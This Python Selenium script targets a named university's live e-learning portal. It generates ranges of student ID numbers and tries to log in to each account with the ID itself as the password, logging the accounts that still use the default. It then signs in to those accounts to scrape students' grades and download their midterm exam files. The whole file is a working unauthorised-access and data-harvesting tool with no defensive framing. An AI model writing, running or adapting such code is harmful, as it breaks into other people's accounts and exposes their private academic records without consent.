from attr import NOTHING
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from student_def import Student
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException,  WebDriverException
import time
import os

def go_to_course(driver, course_title, semester):
    wait = WebDriverWait(driver, 600)
    # find link for semester
    semester_link = wait.until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, f"[title*='{semester}")))
    semester_elem = semester_link.find_element_by_xpath("..")
    semester_box = semester_elem.find_element_by_xpath("img[1]")
    semester_box.click()

    # find link for course
    course_link = wait.until(
        EC.element_to_be_clickable((By.CSS_SELECTOR, f"[title*='{course_title}']")))
    course_link.click()

def from_grades_page_click_file(driver, assignment_link, filetype): #"Midterm Exam File Upload"
    driver.find_element_by_partial_link_text(assignment_link).click()
    time.sleep(2)
    try:
        driver.find_element_by_partial_link_text(filetype).click()
        print(f"File with hint {filetype} was clicked.")
    except NoSuchElementException as e:
        print(f"Error: no link containing {filetype} found. ")
        if True:
            print(e)

def get_unchanged(candidates, browser):
    """Helper function to get student ids with unchanged passwords.

    Args:
        candidates (list[str]): Student IDs to be probed.
        browser (str): Browser to be used (only chrome and firefox supported)

    Returns:
        list[str]: Student IDs with default passwords.
    """
    unchanged = []
    for cand in candidates:
        driver = login(cand, cand, browser)

        if driver is None:
            print(f'User {cand} could not login with password {cand}.')
            with open('changed.txt', 'a') as the_file:
                the_file.write(f"{cand}\n")
        else:
            print(f'User {cand} has not changed their password.')
            unchanged.append(cand)
            with open('unchanged.txt', 'a') as the_file:
                the_file.write(f"{cand}\n")
            # get_grades(driver, cand, cand)
            driver.quit()

    return unchanged


def dir_path(string):
    if os.path.isfile(string):
        return string
    else:
        return NotADirectoryError(string)


def generate_list(
    bachelors=True, masters=False, phd=False,
    _year0=103, _year1=110,
    _dep0=212, _dep1=213,
    _sid0=00, _sid1=99
) -> list[str]:
    """Helper function to generate list of student ID numbers following NDHU's standard.

    Args:
        bachelors (bool, optional): Indicate if bachelor student should be included. Defaults to True.
        masters (bool, optional): Indicate if master students should be included. Defaults to False.
        phd (bool, optional): Indicate if phd students should be included. Defaults to False.
        _year0 (int, optional): Begin generation at this year number (inclusive). Defaults to 103.
        _year1 (int, optional): End generation at this year number (inclusive). Defaults to 110.
        _dep0 (int, optional): Begin generation for department number at this number. Defaults to 212.
        _dep1 (int, optional): End generation for department number at this number. Defaults to 213.
        _sid0 (int, optional): Begin generation for department specific student number at this value. Defaults to 0.
        _sid1 (int, optional): End generation for department specific student number at this value. Defaults to 99.

    Returns:
        _type_: list of student IDs.
    """

    degrees = []
    degrees.append('4') if bachelors else NOTHING
    degrees.append('6') if masters else NOTHING
    degrees.append('8') if phd else NOTHING

    inc = 1
    if _year0 > _year1:
        inc = -1

    print(f"Generating list with the following parameters:\n")
    print("Including " +
          ("BACHELOR " if bachelors else "") +
          ("MASTER " if masters else "") +
          ("PHD " if phd else "") +
          f"students from years {_year0} through {_year1} " +
          f"and departments {_dep0} through {_dep1} " +
          f"with final digits {_sid0} through {_sid1}.")
    candidates = []
    for degree in degrees:
        for year in range(_year0, _year1, inc):
            for dep in range(_dep0, _dep1):
                for number in range(_sid0, _sid1):
                    new_stud = degree + str(year)
                    dept = str(dep)
                    dept = f'{dept: >3}'.format('0').replace(' ', '0')
                    num = str(number)
                    num = f'{num: >2}'.format('0').replace(' ', '0')
                    new_stud += dept
                    new_stud += num
                    candidates.append(new_stud)
                    # print(new_stud)

    return candidates


def login(_username, _password, browser):
    """Login helper function for NDHU's elearning portal. 
    Returns driver if user/pass combination exists, returns None if it doesn't.

    Args:
        _username (str): username (typically a student number)
        _password (str): password (same as username by default)
        browser (str): choose either chrome or firefox

    Returns:
        selenium.webdriver: driver at NDHU elearning dashboard.
    """
    profile = webdriver.FirefoxProfile()
    if browser == 'chrome':
        profile = webdriver.ChromeOptions()
        profile.add_argument('ignore-certificate-errors')
        profile.add_experimental_option("prefs", {
        "download.default_directory": r"/home/joelchang/Projects/ndhuwebs/",
        "download.prompt_for_download": False,
        "download.directory_upgrade": True,
        "safebrowsing.enabled": True
        })
        driver = webdriver.Chrome(chrome_options=profile)
    elif browser == 'firefox':
        profile.accept_untrusted_certs = True
        driver = webdriver.Firefox(firefox_profile=profile)

    for i in range(50):
        try:
            driver.get('http://www.elearn.ndhu.edu.tw/')
            break
        except WebDriverException:
            print("Couldn't connect, sleeping 10 seconds before retrying.")
        time.sleep(10)

    username = driver.find_element_by_xpath('//*[@id="login_username"]')
    username.send_keys(_username)
    password = driver.find_element_by_xpath('//*[@id="login_password"]')
    password.send_keys(_password)

    login_button = driver.find_element_by_xpath(
        '//*[@id="login"]/div[2]/input[2]')
    login_button.click()

    WebDriverWait(driver, 600).until(EC.url_changes)

    if driver.current_url == 'http://www.elearn.ndhu.edu.tw/moodle/login/index.php':  # not logged in
        driver.quit()
        return None
    elif driver.current_url == 'http://www.elearn.ndhu.edu.tw/moodle/index.php?lang=en_utf8':  # logged in
        return driver


def get_grades(driver, username, password, semester="all", course="all"):
    """
    Given a driver at the NDHU elearning dashboard, this function will 
    start to get the grades that have been entered by teachers. 
    Strictly getting grades from the grades link in each course.

    Args:
        driver (selenium.webdriver): driver at NDHU's elearning dashboard
        username (str): username (typically a student id)
        password (str): password (same as username by default)
    """
    if driver is not None:
        print(f'Account {username} accessed with {password}')
        new_student = Student(username, password)
        new_info = []
        # //*[@id="objTreeMenu_1_node_1_1_2"]/nobr/a
        time.sleep(4)
        if semester == 'all' and course == 'all':
            tree_menu_elements = driver.find_elements(
                by=By.CLASS_NAME, value="treeMenuDefault")
            tree_menus_ids = []
            time.sleep(3)
            for element in tree_menu_elements:
                tree_menus_ids.append(str(element.get_attribute("id")).replace(
                    "objTreeMenu_1_node_1_", '').split('_'))
            print(tree_menus_ids)
            for i in tree_menus_ids:
                if len(i) == 1:
                    # semester index
                    time.sleep(2)
                    semester = driver.find_element_by_xpath(
                        f'//*[@id="objTreeMenu_1_node_1_{i[0]}"]/nobr/a/span')
                    semester_text = semester.text
                elif len(i) == 2:
                    # course index
                    time.sleep(2)
                    course = driver.find_element_by_xpath(
                        f'//*[@id="objTreeMenu_1_node_1_{i[0]}_{i[1]}"]/nobr/a')
                    course_text = course.text
                    course_link = course.get_attribute("href")
                    driver.get(course_link)
                    grades_link = driver.find_element(
                        by=By.LINK_TEXT, value='Grades')
                    grades_link.click()
                    # from here, get the last row in each column
                    time.sleep(2)
                    num_r0 = driver.find_elements(by=By.CLASS_NAME, value='r0')
                    num_r1 = driver.find_elements(by=By.CLASS_NAME, value='r1')
                    last_is_1 = False
                    if len(num_r0) == len(num_r1):
                        last_is_1 = True
                    # check if even and odds are the same
                    total_rows = len(num_r0) + len(num_r1)
                    last_row = total_rows + 1  # one empty tr + number of r0 + number of r1
                    time.sleep(2)
                    total_score = driver.find_element_by_xpath(
                        f'//*[@id="user-grade"]/tbody/tr[{last_row}]/td[4]/span').text
                    print(f'    Total score: {total_score}')
                    new = [semester_text, course_text, total_score]
                    new_info.append(new)
                    driver.get("http://www.elearn.ndhu.edu.tw/moodle/")
            new_student.set_grades(new_info)
            for piece in new_student.grades:
                print(piece)
        elif semester != 'all' and course != 'all':
            go_to_course(driver, semester=semester, course_title=course)
            grades_link = driver.find_element(
                by=By.LINK_TEXT, value='Grades')
            grades_link.click()
            time.sleep(2)
            from_grades_page_click_file(driver, 'Midterm Exam', 'doc')
            time.sleep(2)
        driver.quit()

